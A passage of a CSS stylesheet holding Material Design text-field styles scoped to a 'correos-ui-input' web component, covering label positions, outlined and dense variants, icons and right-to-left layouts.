			width: var(--mdc-ripple-fg-size, 100%);
			height: var(--mdc-ripple-fg-size, 100%)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.6)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.87)
		}

		.mdc-text-field.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			caret-color: #6200ee;
			caret-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: rgba(0, 0, 0, 0.42)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
			border-bottom-color: rgba(0, 0, 0, 0.87)
		}

		.mdc-text-field.sc-correos-ui-input .mdc-line-ripple.sc-correos-ui-input {
			background-color: #6200ee;
			background-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--textarea) {
			border-bottom-color: rgba(0, 0, 0, 0.12)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.6)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field-character-counter.sc-correos-ui-input,
		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.6)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__icon.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.54)
		}

		.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) {
			background-color: whitesmoke
		}

		.mdc-text-field.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 16px;
			right: initial;
			top: 50%;
			-webkit-transform: translateY(-50%);
			transform: translateY(-50%);
			pointer-events: none
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 16px
		}

		.mdc-text-field.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-106%) scale(0.75);
			transform: translateY(-106%) scale(0.75)
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 4px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 4px
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 4px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 4px
		}

		.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 36px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 36px
		}

		.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			left: 40px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 40px
		}

		.mdc-text-field__input.sc-correos-ui-input {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 1rem;
			font-weight: 400;
			letter-spacing: 0.009375em;
			text-decoration: inherit;
			text-transform: inherit;
			-ms-flex-item-align: end;
			align-self: flex-end;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			width: 100%;
			height: 100%;
			padding: 20px 16px 6px;
			-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
			border: none;
			border-bottom: 1px solid;
			border-radius: 0;
			background: none;
			-webkit-appearance: none;
			-moz-appearance: none;
			appearance: none
		}

		.mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder {
			-webkit-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			color: rgba(0, 0, 0, 0.54)
		}

		.mdc-text-field__input.sc-correos-ui-input::-moz-placeholder {
			-moz-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			color: rgba(0, 0, 0, 0.54)
		}

		.mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder {
			-ms-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			color: rgba(0, 0, 0, 0.54)
		}

		.mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder {
			-ms-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			color: rgba(0, 0, 0, 0.54)
		}

		.mdc-text-field__input.sc-correos-ui-input::placeholder {
			-webkit-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
			opacity: 0;
			color: rgba(0, 0, 0, 0.54)
		}

		.mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder {
			color: rgba(0, 0, 0, 0.54) !important
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder,
		.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder,
		.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder {
			-webkit-transition-delay: 40ms;
			transition-delay: 40ms;
			-webkit-transition-duration: 110ms;
			transition-duration: 110ms;
			opacity: 1
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-moz-placeholder,
		.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-moz-placeholder,
		.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-moz-placeholder {
			transition-delay: 40ms;
			transition-duration: 110ms;
			opacity: 1
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder,
		.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder,
		.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder {
			transition-delay: 40ms;
			transition-duration: 110ms;
			opacity: 1
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder,
		.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder,
		.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder {
			transition-delay: 40ms;
			transition-duration: 110ms;
			opacity: 1
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::placeholder,
		.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::placeholder,
		.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::placeholder {
			-webkit-transition-delay: 40ms;
			transition-delay: 40ms;
			-webkit-transition-duration: 110ms;
			transition-duration: 110ms;
			opacity: 1
		}

		.mdc-text-field__input.sc-correos-ui-input:focus {
			outline: none
		}

		.mdc-text-field__input.sc-correos-ui-input:invalid {
			-webkit-box-shadow: none;
			box-shadow: none
		}

		.mdc-text-field__input.sc-correos-ui-input:-webkit-autofill {
			z-index: auto !important
		}

		.mdc-text-field--no-label.sc-correos-ui-input:not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			padding-top: 16px;
			padding-bottom: 16px
		}

		.mdc-text-field__input.sc-correos-ui-input:-webkit-autofill+.mdc-floating-label.sc-correos-ui-input {
			-webkit-transform: translateY(-50%) scale(0.75);
			transform: translateY(-50%) scale(0.75);
			cursor: auto
		}

		.mdc-text-field--outlined.sc-correos-ui-input {
			border: none;
			overflow: visible
		}

		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: rgba(0, 0, 0, 0.38)
		}

		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: rgba(0, 0, 0, 0.87)
		}

		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #6200ee;
			border-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined 250ms 1;
			animation: mdc-floating-label-shake-float-above-text-field-outlined 250ms 1
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input {
			border-radius: 4px 0 0 4px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading[dir=rtl].sc-correos-ui-input {
			border-radius: 0 4px 4px 0
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-radius: 0 4px 4px 0
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing[dir=rtl].sc-correos-ui-input {
			border-radius: 4px 0 0 4px
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-37.25px) scale(1);
			transform: translateY(-37.25px) scale(1)
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 0.75rem
		}

		.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-34.75px) scale(0.75);
			transform: translateY(-34.75px) scale(0.75)
		}

		.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 1rem
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
			padding-top: 1px
		}

		.mdc-text-field--outlined.sc-correos-ui-input::before,
		.mdc-text-field--outlined.sc-correos-ui-input::after {
			content: none
		}

		.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) {
			background-color: transparent
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			display: -ms-flexbox;
			display: flex;
			padding: 12px 16px 14px;
			border: none !important;
			background-color: transparent;
			z-index: 1
		}

		.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			z-index: 2
		}

		.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
			padding-top: 2px
		}

		.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-width: 2px
		}

		.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input {
			background-color: transparent
		}

		.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: rgba(0, 0, 0, 0.06)
		}

		.mdc-text-field--outlined.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			border-bottom: none
		}

		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input {
			height: 48px
		}

		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-134%) scale(1);
			transform: translateY(-134%) scale(1)
		}

		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 0.8rem
		}

		.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-120%) scale(0.8);
			transform: translateY(-120%) scale(0.8)
		}

		.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 1rem
		}

		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-dense 250ms 1;
			animation: mdc-floating-label-shake-float-above-text-field-outlined-dense 250ms 1
		}

		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding: 12px 12px 7px
		}

		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			top: 14px
		}

		.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			top: 12px
		}

		.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: 16px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 16px
		}

		.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 48px;
			padding-right: 16px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 16px;
			padding-right: 48px
		}

		.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 48px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 48px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: 16px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 16px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 48px;
			padding-right: 16px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 16px;
			padding-right: 48px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-37.25px) translateX(-32px) scale(1);
			transform: translateY(-37.25px) translateX(-32px) scale(1)
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
			-webkit-transform: translateY(-37.25px) translateX(32px) scale(1);
			transform: translateY(-37.25px) translateX(32px) scale(1)
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 0.75rem
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-34.75px) translateX(-32px) scale(0.75);
			transform: translateY(-34.75px) translateX(-32px) scale(0.75)
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input,
		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
			-webkit-transform: translateY(-34.75px) translateX(32px) scale(0.75);
			transform: translateY(-34.75px) translateX(32px) scale(0.75)
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 1rem
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon 250ms 1;
			animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon 250ms 1
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined[dir=rtl].sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl 250ms 1;
			animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-rtl 250ms 1
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 36px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 36px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-134%) translateX(-21px) scale(1);
			transform: translateY(-134%) translateX(-21px) scale(1)
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
			-webkit-transform: translateY(-134%) translateX(21px) scale(1);
			transform: translateY(-134%) translateX(21px) scale(1)
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 0.8rem
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-120%) translateX(-21px) scale(0.8);
			transform: translateY(-120%) translateX(-21px) scale(0.8)
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input,
		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
			-webkit-transform: translateY(-120%) translateX(21px) scale(0.8);
			transform: translateY(-120%) translateX(21px) scale(0.8)
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 1rem
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense 250ms 1;
			animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense 250ms 1
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense[dir=rtl].sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl 250ms 1;
			animation: mdc-floating-label-shake-float-above-text-field-outlined-leading-icon-dense-rtl 250ms 1
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 32px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--outlined.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 32px
		}

		.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: initial;
			right: 12px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: 12px;
			right: initial
		}

		.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 16px;
			padding-right: 48px
		}

